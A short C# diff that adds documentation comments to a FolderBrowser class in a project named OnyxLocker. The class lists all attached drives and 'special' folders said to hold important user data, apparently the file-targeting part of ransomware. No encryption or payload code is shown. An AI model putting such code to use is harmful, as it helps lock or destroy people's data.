@@ -7,6 +7,10 @@ namespace OnyxLocker.Classes
 {
     internal class FolderBrowser : IDriveExplorer
     {
+        /// <summary>
+        /// Gets all the attached drives
+        /// </summary>
+        /// <returns></returns>
         public List<string> GetStartingFolders()
         {
             var connectedDrives = DriveInfo.GetDrives().Select(drive => drive.Name).ToList();
@@ -15,6 +19,10 @@ namespace OnyxLocker.Classes
             return connectedDrives;
         }
 
+        /// <summary>
+        /// Gets the few "special" folders which probably contain important user data
+        /// </summary>
+        /// <returns></returns>
         private List<string> GetSpecialFolders()
         {
             return new List<string>()
